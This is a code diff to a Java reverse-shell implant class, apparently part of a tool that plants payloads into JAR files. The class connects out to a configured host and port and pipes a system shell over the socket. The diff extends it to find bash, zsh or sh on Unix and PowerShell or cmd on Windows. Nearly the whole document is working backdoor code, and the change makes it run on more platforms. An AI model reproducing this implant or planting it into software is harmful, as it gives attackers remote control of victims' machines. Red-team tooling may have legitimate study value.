@@ -1,10 +1,16 @@
 package io.github.w1th4d.jarplant.implants;
 
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
+import java.nio.file.Files;
+import java.nio.file.Path;
 import java.time.Duration;
+import java.util.Arrays;
+import java.util.List;
+import java.util.Optional;
 
 public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandler {
     // Standard config fields from ClassImplant template:
@@ -63,6 +69,12 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
             return;
         }
 
+        Optional<Path> shellCommand = findShellExecutable();
+        if (shellCommand.isEmpty()) {
+            System.out.println("[!] Cannot find shell executable!");
+            return;
+        }
+
         while (!Thread.interrupted()) {
             System.out.println("[$] Connecting to " + CONF_LHOST + ":" + CONF_LPORT + "...");
             try (Socket connection = new Socket(CONF_LHOST, CONF_LPORT)) {
@@ -71,7 +83,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 System.out.println("[+] Connected to " + CONF_LHOST + ":" + CONF_LPORT + "!");
 
                 Process shell = new ProcessBuilder()
-                        .command("/bin/bash")
+                        .command(shellCommand.get().toAbsolutePath().toString())
                         .redirectErrorStream(true)
                         .start();
                 InputStream fromShell = shell.getInputStream();
@@ -136,6 +148,77 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
             input.close();
             output.close();
         } catch (IOException ignored) {
+        }
+    }
+
+    /**
+     * Find the most preferred shell.
+     *
+     * @return maybe a path to an executable file
+     */
+    private static Optional<Path> findShellExecutable() {
+        String osName = System.getProperty("os.name").toLowerCase();
+        if (osName.startsWith("windows")) {
+            String pathEnv = System.getenv("PATH");
+            return findWindowsShellExecutable(pathEnv);
+        } else if (osName.startsWith("linux")) {
+            return findUnixShellExecutable();
+        } else if (osName.startsWith("mac")) {
+            return findUnixShellExecutable();
+        } else {
+            return Optional.empty();
+        }
+    }
+
+    static Optional<Path> findUnixShellExecutable() {
+        List<Path> candidates = Arrays.asList(
+                Path.of("/bin/bash"),
+                Path.of("/bin/zsh"),
+                Path.of("/bin/sh")
+        );
+        for (Path candidate : candidates) {
+            if (Files.exists(candidate) && Files.isExecutable(candidate)) {
+                return Optional.of(candidate);
+            }
+        }
+
+        return Optional.empty();
+    }
+
+    static Optional<Path> findWindowsShellExecutable(String pathEnv) {
+        if (pathEnv == null || pathEnv.isEmpty()) {
+            return Optional.empty();
+        }
+
+        Optional<Path> powershell = Optional.empty();
+        Optional<Path> cmd = Optional.empty();
+
+        String[] binPaths = pathEnv.split(File.pathSeparator);
+        for (String binPath : binPaths) {
+            Path path = Path.of(binPath);
+            if (Files.exists(path) && Files.isDirectory(path)) {
+                if (powershell.isEmpty()) {
+                    Path candidate = path.resolve("powershell.exe");
+                    if (Files.exists(candidate) && Files.isExecutable(candidate)) {
+                        powershell = Optional.of(candidate);
+                    }
+                }
+
+                if (cmd.isEmpty()) {
+                    Path candidate = path.resolve("cmd.exe");
+                    if (Files.exists(candidate) && Files.isExecutable(candidate)) {
+                        cmd = Optional.of(candidate);
+                    }
+                }
+            }
+        }
+
+        if (powershell.isPresent()) {
+            return powershell;
+        } else if (cmd.isPresent()) {
+            return cmd;
+        } else {
+            return Optional.empty();
         }
     }
 
